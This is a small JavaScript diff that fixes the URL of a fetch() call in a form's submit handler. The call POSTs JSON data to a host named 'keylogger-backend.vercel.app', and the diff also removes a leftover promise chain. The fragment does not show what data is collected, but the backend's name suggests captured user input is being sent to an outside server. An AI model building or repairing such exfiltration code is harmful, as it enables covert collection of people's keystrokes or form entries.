@@ -122,23 +122,13 @@ submitBtn.onclick = async () => {
   };
 
   try {
-    const response = await fetch("keylogger-backend.vercel.app/api/submit", {
+    const response = await fetch("https://keylogger-backend.vercel.app/api/submit", {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
   },
   body: JSON.stringify(data)
 })
-.then(res => res.json())
-.then(result => {
-  alert("Data submitted successfully!");
-  console.log(result);
-})
-.catch(err => {
-  console.error(err);
-  alert("Submission failed");
-});
-
 
     if (!response.ok) throw new Error("Server error");
 
